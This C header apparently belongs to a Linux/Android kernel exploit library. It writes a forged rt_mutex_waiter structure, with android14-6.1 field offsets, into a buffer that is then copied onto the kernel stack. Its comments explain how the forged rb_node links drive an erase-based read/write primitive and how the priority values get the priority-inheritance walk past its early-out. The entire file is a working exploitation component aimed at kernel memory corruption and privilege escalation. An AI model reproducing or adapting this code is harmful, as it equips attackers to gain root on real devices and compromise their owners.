/* lib/rtmutex/fake_waiter.h -- composing a forged rt_mutex_waiter in a plain
 * byte buffer.
 *
 * For the reclaim vehicles (lib/rtmutex/reclaim_vehicle.h) that copy a flat
 * buffer onto the kernel stack unchanged -- a getsockopt/setsockopt struct, a
 * signal frame. It writes the full waiter layout at a caller-chosen byte
 * offset in a buffer the caller already owns, so such a vehicle only has to
 * say where. A vehicle that instead copies user bytes into a word-indexed
 * structure it interprets itself (an fd_set bitmap) needs its own placement
 * math and does not use this module.
 *
 * The write shape follows the erase primitive: it reads tree_entry and
 * pi_tree_entry (the two rb_node objects this waiter sits in), task and lock
 * are what the priority-inheritance walk dereferences, and prio/deadline are
 * read but not corruption-critical. wake_state and ww_ctx are written as zero
 * to round out a well-formed object on flavours that have them, and land past
 * the struct's end, at the offsets the target description gives, on flavours
 * that do not.
 *
 * Header-only. The FAKE_WAITER_*_OFF constants are #ifndef-guarded defaults
 * (android14-6.1's layout) so this compiles standalone; every real build gets
 * them from its own target description, per lib/README.md.
 */
#ifndef LIB_RTMUTEX_FAKE_WAITER_H
#define LIB_RTMUTEX_FAKE_WAITER_H

#include <stdint.h>
#include <string.h>

#include "../base/bytes.h"

#ifndef FAKE_WAITER_TREE_PRIO_OFF
#define FAKE_WAITER_TREE_PRIO_OFF        0x44
#endif
#ifndef FAKE_WAITER_TREE_DEADLINE_OFF
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x48
#endif
#ifndef FAKE_WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x18
#endif
#ifndef FAKE_WAITER_PI_TREE_PRIO_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x44
#endif
#ifndef FAKE_WAITER_PI_TREE_DEADLINE_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#endif
#ifndef FAKE_WAITER_TASK_OFF
#define FAKE_WAITER_TASK_OFF             0x30
#endif
#ifndef FAKE_WAITER_LOCK_OFF
#define FAKE_WAITER_LOCK_OFF             0x38
#endif
#ifndef FAKE_WAITER_WAKE_STATE_OFF
#define FAKE_WAITER_WAKE_STATE_OFF       0x40
#endif
#ifndef FAKE_WAITER_WW_CTX_OFF
#define FAKE_WAITER_WW_CTX_OFF           0x50
#endif

/* Total bytes lib_rtmutex_fake_waiter() writes, starting at the caller's off
 * -- the last field written is the 8-byte ww_ctx slot, so this is its offset
 * plus its width. A caller sizing a buffer or a placement window against
 * anything smaller will write past what it checked. */
#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + 8)

/* The prio the forged waiter carries, and the prio of the page-internal fake
 * task. The pi-chain adjust compares the forged waiter's prio against the live
 * blocked task's prio (rt_mutex_waiter_equal); they must differ from a
 * default-nice task's prio (120) for the walk to run past the priority
 * early-out, which is why the waiter's is 130. */
#ifndef FAKE_WAITER_PRIO
#define FAKE_WAITER_PRIO 130
#endif
#ifndef FAKE_TASK_PRIO
#define FAKE_TASK_PRIO 120
#endif

/* What the erase primitive and the priority walk actually need; see the file
 * header for which fields those are versus which are along for the ride.
 * tree_right/pi_right are usually 0 -- the read/write primitive names the
 * write target through tree_left/pi_left and the write value through
 * tree_parent/pi_parent; a caller wanting the other unlink direction sets
 * tree_right/pi_right instead and leaves the *_left pair zero. */
struct lib_fake_waiter {
	uint64_t tree_parent, tree_right, tree_left;
	uint64_t pi_parent, pi_right, pi_left;
	uint64_t task, lock;
	uint32_t prio;
};

/* Write a fully-formed forged waiter at buf+off. buf must have at least
 * off + FAKE_WAITER_LAYOUT_SIZE bytes. */
static inline void lib_rtmutex_fake_waiter(
    unsigned char *buf, size_t off, const struct lib_fake_waiter *w)
{
	lib_put64(buf, off + 0x00, w->tree_parent);
	lib_put64(buf, off + 0x08, w->tree_right);
	lib_put64(buf, off + 0x10, w->tree_left);
	lib_put32(buf, off + FAKE_WAITER_TREE_PRIO_OFF, w->prio);
	lib_put64(buf, off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
	lib_put64(buf, off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, w->pi_parent);
	lib_put64(buf, off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, w->pi_right);
	lib_put64(buf, off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, w->pi_left);
	lib_put32(buf, off + FAKE_WAITER_PI_TREE_PRIO_OFF, w->prio);
	lib_put64(buf, off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
	lib_put64(buf, off + FAKE_WAITER_TASK_OFF, w->task);
	lib_put64(buf, off + FAKE_WAITER_LOCK_OFF, w->lock);
	lib_put32(buf, off + FAKE_WAITER_WAKE_STATE_OFF, 0);
	lib_put64(buf, off + FAKE_WAITER_WW_CTX_OFF, 0);
}

#endif /* LIB_RTMUTEX_FAKE_WAITER_H */
